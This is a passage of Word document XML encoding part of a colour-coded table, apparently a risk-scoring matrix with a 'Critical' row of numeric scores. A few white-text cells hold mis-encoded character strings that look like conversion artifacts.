            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Cambria"/>
                <w:color w:val="FFFFFF"/>
                <w:w w:val="72"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>12!1.03!0045!.567!5895!.467!:;83!</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="580" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:spacing w:line="192" w:lineRule="exact"/>
              <w:jc w:val="right"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Cambria"/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="900" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:spacing w:line="192" w:lineRule="exact"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Cambria"/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>/;0!383;!</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="301"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="300" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="260" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FFFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="320" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1040" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="80"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="420" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:right="63"/>
              <w:jc w:val="right"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="520" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="400" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="40"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="120" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FFFF00"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>32</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="580" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>36</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:right="3"/>
              <w:jc w:val="right"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>48</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="80"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>32</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>48</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>64</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="103"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="300" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="260" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FFFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="320" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1040" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="420" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
